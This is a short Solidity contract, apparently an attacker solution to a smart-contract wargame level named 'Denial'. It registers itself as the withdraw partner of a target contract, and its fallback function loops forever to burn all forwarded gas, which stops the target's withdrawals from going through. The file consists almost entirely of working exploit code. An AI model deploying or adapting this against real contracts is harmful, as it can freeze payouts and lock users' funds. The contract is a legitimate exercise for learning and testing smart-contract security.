pragma solidity ^0.8.0;

contract GasDrainAttackerV2 {
    address public denial;

    constructor(address payable _denial) {
        denial = _denial;
    }

    function setPartnerV2() external {
        (bool success, ) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)"     , address(this)));
        require(success, "set partner failed");
    }



    fallback() external payable {
        while (true) {
            // Infinite loop consumes all gas
        }
    }

    receive() external payable {
        // Optional: allow deposits
    }
}